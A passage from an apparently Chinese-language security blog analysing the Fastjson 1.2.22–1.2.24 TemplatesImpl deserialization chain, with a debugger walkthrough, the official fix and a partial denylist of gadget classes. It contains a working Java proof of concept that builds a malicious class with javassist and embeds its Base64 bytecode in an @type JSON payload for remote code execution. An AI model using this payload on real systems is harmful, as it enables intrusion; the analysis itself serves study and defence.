class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setCmd</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        <span class="hljs-keyword">this</span>.cmd = cmd;<br>        Runtime.getRuntime().exec(<span class="hljs-keyword">this</span>.cmd);<br>        System.out.println(<span class="hljs-string">&quot;调用了setCmd方法&quot;</span>);<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getCmd</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;调用了getCmd方法&quot;</span>);<br>        <span class="hljs-keyword">return</span> cmd;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/8.png"></p><h2 id="4-setter和getter方法自动调用的原因"><a href="#4-setter和getter方法自动调用的原因" class="headerlink" title="4.setter和getter方法自动调用的原因"></a>4.setter和getter方法自动调用的原因</h2><p>具体的原因可以看这篇文章： <a href="http://wjlshare.com/archives/1512#type">http://wjlshare.com/archives/1512#type</a></p><h2 id="5-JSON-parseObject方法有无Object-class属性的区别"><a href="#5-JSON-parseObject方法有无Object-class属性的区别" class="headerlink" title="5.JSON.parseObject方法有无Object.class属性的区别"></a>5.JSON.parseObject方法有无Object.class属性的区别</h2><p>​    上面文章有写过<code>JSON.parseObject</code>和<code>JSON.parse</code>的返回对象类是不一样的，为了让<code>JSON.parseObject()</code>返回的类是目标类而不是<code>com.alibaba.fastjson.JSONObject</code>。其实还可以发现，有无该参数与是否调用<code>getter</code>方法是有联系的。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/10.png"></p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/11.png"></p><h2 id="6-Feature-SupportNonPublicField属性"><a href="#6-Feature-SupportNonPublicField属性" class="headerlink" title="6.Feature.SupportNonPublicField属性"></a>6.Feature.SupportNonPublicField属性</h2><p>​    我们前面的例子都是在<code>setter</code>和<code>getter</code>以及相关属性为<code>public</code>的情况下，反序列化数据后触发了<code>setter</code>或者<code>getter</code>导致的命令执行。但是如果我们的属性或者<code>setter</code>以及<code>getter</code>方法是<code>private</code>呢？我们来看看两者的区别。</p><p>当属性<code>cmd</code>以及<code>setCmd</code>和<code>getCmd</code>都是<code>public</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> FastjsonTest;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> String cmd;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Evil</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;调用了构造方法&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setCmd</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        <span class="hljs-keyword">this</span>.cmd = cmd;<br>        System.out.println(<span class="hljs-string">&quot;调用了setCmd方法&quot;</span>);<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getCmd</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;调用了getCmd方法&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.cmd;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>注意：红框中的<code>getCmd</code>是代码 12行调用的。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/9.png"></p><p>当属性<code>cmd</code>和方法<code>setCmd</code>是<code>private</code>而<code>getCmd</code>是<code>public</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> FastjsonTest;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> String cmd;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Evil</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;调用了构造方法&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setCmd</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        <span class="hljs-keyword">this</span>.cmd = cmd;<br>        System.out.println(<span class="hljs-string">&quot;调用了setCmd方法&quot;</span>);<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getCmd</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;调用了getCmd方法&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.cmd;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>可以发现，反序列化后，属性<code>cmd</code>并没有被赋值。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/12.png"></p><p><code>Feature.SupportNonPublicField</code>参数解决以上<code>private</code>的属性和<code>setter</code>没办法控制<code>private</code>属性的问题，</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/13.png"></p><h1 id="3-TemplatesImp利用POC分析"><a href="#3-TemplatesImp利用POC分析" class="headerlink" title="3.TemplatesImp利用POC分析"></a>3.TemplatesImp利用POC分析</h1><p>我们从下面的POC来进行分析学习吧：</p><p>以下POC起始也很好理解，关于<code>TemplatesImp</code>在反序列化的利用，我在关于CC2链的分析的文章也分析过。</p><h2 id="1-POC"><a href="#1-POC" class="headerlink" title="1.POC"></a>1.POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> FastjsonTest;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Poc</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">generateEvil</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        ClassPool pool = ClassPool.getDefault();<br>        CtClass clas = pool.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        String cmd = <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;deepin-calculator\&quot;);&quot;</span>;<br>        clas.makeClassInitializer().insertBefore(cmd);<br>        clas.setSuperclass(pool.getCtClass(AbstractTranslet.class.getName()));<br><br>        clas.writeFile(<span class="hljs-string">&quot;./&quot;</span>);<br><br>        <span class="hljs-keyword">byte</span>[] bytes = clas.toBytecode();<br>        String EvilCode = Base64.getEncoder().encodeToString(bytes);<br>        System.out.println(EvilCode);<br>        <span class="hljs-keyword">return</span> EvilCode;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-keyword">final</span> String GADGAT_CLASS = <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;<br>        String evil = Poc.generateEvil();<br>        String PoC = <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + GADGAT_CLASS + <span class="hljs-string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + evil + <span class="hljs-string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span> + <span class="hljs-string">&quot;\&quot;_name\&quot;:\&quot;a\&quot;,\&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;\n&quot;</span>;<br>        JSON.parseObject(PoC,Object.class, Feature.SupportNonPublicField);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/14.png"></p><h2 id="2-后端程序反序列化触发条件"><a href="#2-后端程序反序列化触发条件" class="headerlink" title="2.后端程序反序列化触发条件"></a>2.后端程序反序列化触发条件</h2><p>​    目标后端程序进行反序列化解析的时候必须有如下条件，才能触发。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JSON</span>.</span></span>parse<span class="hljs-constructor">Object(<span class="hljs-params">input</span>,Object.<span class="hljs-params">class</span>, Feature.SupportNonPublicField)</span>;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JSON</span>.</span></span>parse(input,Feature.SupportNonPublicField)<br></code></pre></td></tr></table></figure><p><code>Object.class</code>是因为<code>parseObject</code>如果不传入<code>Object.class</code>则会返回<code>fastjson.JSONObject</code>，无法将传入的类进行转换。</p><p><code>Feature.SupportNonPublicField</code>参数是为了能够控制目标类的私有属性。例如：<code>_bytecodes</code>用来存恶意字节码的。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/15.png"></p><h2 id="3-bytecodes的值为啥需要BASE64加密"><a href="#3-bytecodes的值为啥需要BASE64加密" class="headerlink" title="3._bytecodes的值为啥需要BASE64加密"></a>3._bytecodes的值为啥需要BASE64加密</h2><p>在<code>com/alibaba/fastjson/serializer/ObjectArrayCodec</code>的<code>deserialze</code>方法调用了<code>bytesValue</code>方法</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/17.png"></p><p>跟进<code>bytesValue</code>方法，位置：<code>com/alibaba/fastjson/parser/JSONScanner.bytesValue()</code> 90行，进行了Base64的解密操作。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/18.png"></p><h2 id="4-tfactory为什么是"><a href="#4-tfactory为什么是" class="headerlink" title="4._tfactory为什么是{}"></a>4._tfactory为什么是{}</h2><p>​    我们之前关于<code>TemplatesImp#defineclass</code>加载字节码的文章有写过，<code>_tfactory</code>的值是不能为<code>null</code>的，在这里需要的是一个<code>TransformerFactoryImpl</code>实例。</p><p>​    但是可以发现如果传入的键值为空的话，如果为空会根据类属性定义的类型自动创建实例。</p><h2 id="5-FastJson如何触发TemplatesImpl"><a href="#5-FastJson如何触发TemplatesImpl" class="headerlink" title="5.FastJson如何触发TemplatesImpl"></a>5.FastJson如何触发TemplatesImpl</h2><p>前面说到FastJson在反序列化过程中会自动调用类中的getter函数和setter函数，然后在FastJson在寻找对应的反序列化器的时候会调用一个smartMatch函数来进行模糊匹配，在该函数中会将我们 json中的 <code>_outputProperties</code> 转换成 <code>outputProperties</code>，转换之后fastjson就会找到 getOutputProperties 方法，最后调用时触发了TemplatesImpl的利用链导致RCE。</p><h1 id="4-TemplatesImp在FastJson中的利用链分析"><a href="#4-TemplatesImp在FastJson中的利用链分析" class="headerlink" title="4.TemplatesImp在FastJson中的利用链分析"></a>4.TemplatesImp在FastJson中的利用链分析</h1><p>还是利用如下POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> FastjsonTest;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Poc</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">generateEvil</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        ClassPool pool = ClassPool.getDefault();<br>        CtClass clas = pool.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        String cmd = <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;deepin-calculator\&quot;);&quot;</span>;<br>        clas.makeClassInitializer().insertBefore(cmd);<br>        clas.setSuperclass(pool.getCtClass(AbstractTranslet.class.getName()));<br><br>        clas.writeFile(<span class="hljs-string">&quot;./&quot;</span>);<br><br>        <span class="hljs-keyword">byte</span>[] bytes = clas.toBytecode();<br>        String EvilCode = Base64.getEncoder().encodeToString(bytes);<br>        System.out.println(EvilCode);<br>        <span class="hljs-keyword">return</span> EvilCode;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-keyword">final</span> String GADGAT_CLASS = <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;<br>        String evil = Poc.generateEvil();<br>        String PoC = <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + GADGAT_CLASS + <span class="hljs-string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + evil + <span class="hljs-string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span> + <span class="hljs-string">&quot;\&quot;_name\&quot;:\&quot;a\&quot;,\&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;\n&quot;</span>;<br>        JSON.parseObject(PoC,Object.class, Feature.SupportNonPublicField);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>一步步分析整个反序列化的流程以及<code>TemplatesImp</code>利用链触发：</p><p>首先进入到如下<code>com.alibaba.fastjson.JSON</code>位置的<code>parseObject</code>创建默认的<code>Json</code>解析器，并且将我们传入的序列化的<code>Poc</code>作为输入传入。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/19.png"></p><p>跟进<code>DefaultJSONParser</code>的构造方法：在代码125行会判断我们的<code>input</code>的第一个字符是不是<code>&#123;</code></p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/20.png"></p><p>回到<code>parseObject</code>，在代码218行会调用上面实例化对象<code>parse</code>的<code>parseObject</code>解析传入的类。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/21.png"></p><p>跟进<code>parse</code>对象的<code>parseObject</code>，在代码的579行，<code>getDeserializer</code>方法处理我们传入的<code>type</code>类型获取的反序列化器。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/22.png"></p><p>跟进<code>ParserConfig.getDeserializer</code>方法，可以发现代码276行会根据我们传入的<code>type</code>在<code>this.derializers</code>寻找对应的反序列化器，这里由于我们的type是<code>Object.class</code>所以是能够找到对应的反序列化器的，所以进入第一个if，直接返回找到的反序列化器。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/23.png"></p><p>得到对应的反序列化器后，回到<code>DefaultJSONParser.parseObject()</code>中，在代码582行可以发现程序将上面获得的反序列化器拿来反序列化我们的数据。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/24.png"></p><p>在本例中进入到<code>JavaObjectDeserializer</code>反序列化器中，代码42行</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/25.png"></p><p>进入<code>parse.parse</code>也就是<code>DefaultJSONParser.parse()</code>方法</p><p>进入到switch，根据之前的token值进入对应的case，来到下面这个case处，这里new了一个JSON对象，然后利用<code>DefaultJSONParser.parseObject()</code> 对这个对象进行解析，此时fieleName为null，因为还没解析json字段中的内容</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/26.png"></p><p>跟进<code>DefaultJSONParser.parseObject()</code></p><p>首先会对json进行一些规范的检测，然后就会判断<code>&#123;</code> 下一个字符是不是 <code>&quot;</code> ，由于json数据 <code>&#123;</code> 后面就是<code>&quot;</code> 所以我们继续往下看即可</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/27.png"></p><p>继续往下看会有一个if判断，如果我们的key等于<code>JSON.DEFAULT_TYPE_KEY</code> 同时 没有开启<code>Feature.DisableSpecialKeyDetect</code> 的话就会进入判断，利用loadClass，加载我们的类对象</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/28.png"></p><p>继续往下跟，发现在<code>DefaultJSONParser.parse</code>代码304行会再次寻找反序列化器。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/29.png"></p><p>跟进<code>getDeserializer()</code>方法，由于此时我们的type是<code>class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> 所以自然是找不到的，所以进入第二个if判断。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/30.png"></p><p>​    继续跟进<code>getDeserializer</code>方法，在第319行处会经过一个黑名单处理，会获取我们的类名然后判断我们的类是否在黑名单中。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/31.png"></p><p>一系列的判断后，由于TemplatesImpl类都不在if判断的条件范围内，所以会创建一个<code>JavaBeanDeserializer</code>，将<code>type</code>和类传入。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/32.png"></p><p>获得反序列化器后，将器返回。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/33.png"></p><p>回到<code>ParserConfig.parseObject</code>，获得反序列化器后，正式开始反序列化了。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/34.png"></p><p>跟进<code>JavaBeanDeserializer.deserialize()</code></p><p>在代码547行，开始对我们传入的参数进行解析。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/35.png"></p><p>跟进<code>parseField</code>方法：在代码697行，可以看到利用<code>smartMatch</code>对我们传入的属性进行了模糊匹配，跟进该函数。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/36.png"></p><p>跟进<code>smartMatch()</code>方法，寻找与key对应的反序列化器。找不到对应的反序列化器则返回null。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/37.png"></p><p>当解析我们传入的数据<code>_outputProperties</code>后</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/38.png"></p><p>跟进<code>parseField</code></p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/39.png"></p><p>继续跟进<code>smartMatch</code>：在代码787行发现将<code>_</code>替换为空。继续往下走就会返回反序列化器。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/40.png"></p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/41.png"></p><p>跟进该反序列化器的<code>parseField()</code>方法：</p><p>位置：<code>DefaultFieldDeserializer.parseField</code></p><p>调用与属性对应的反序列化器，对属性进行反序列化，将反序列化后的值赋值给value。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/43.png"></p><p>跟进<code>setValue</code>，可以发现利用反射触发了<code>getOutputProperties</code>方法</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/44.png"></p><p>触发<code>newTransformer</code>方法，看到这里，有了解过的<code>Templateslmp</code>利用链就知道后面会发生什么了。剩下后面的分析就是纯粹的<code>Templateslmp</code>利用链的分析了，可以看看我关于CC2链的分析即可。我就不继续分析了</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/45.png"></p><h1 id="5-修复"><a href="#5-修复" class="headerlink" title="5.修复"></a>5.修复</h1><p>官方的修复如下：<a href="https://github.com/alibaba/fastjson/commit/d52085ef54b32dfd963186e583cbcdfff5d101b5">https://github.com/alibaba/fastjson/commit/d52085ef54b32dfd963186e583cbcdfff5d101b5</a></p><p>将DefaultJSONParser.parseObject中将加载类的<code>TypeUtils.loadClass</code>方法替换为了<code>this.config.checkAutoType()</code>方法</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/46.png"></p><p><code>checkAutoType</code>方法是利用了白名单+黑名单的机制来进行防护。</p><p><code>denyList</code></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">bsh</span><br><span class="hljs-selector-tag">com</span><span class="hljs-selector-class">.mchange</span><br><span class="hljs-selector-tag">com</span><span class="hljs-selector-class">.sun</span>.<br><span class="hljs-selector-tag">java</span><span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.Thread</span><br><span class="hljs-selector-tag">java</span><span class="hljs-selector-class">.net</span><span class="hljs-selector-class">.Socket</span><br><span class="hljs-selector-tag">java</span><span class="hljs-selector-class">.rmi</span><br><span class="hljs-selector-tag">javax</span><span class="hljs-selector-class">.xml</span><br><span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.bcel</span><br><span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.beanutils</span><br><span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.Transformer</span><br><span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.functors</span><br><span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections4</span><span class="hljs-selector-class">.comparators</span><br><span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.fileupload</span><br><span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.myfaces</span><span class="hljs-selector-class">.context</span><span class="hljs-selector-class">.servlet</span><br><span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.tomcat</span><br><span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span 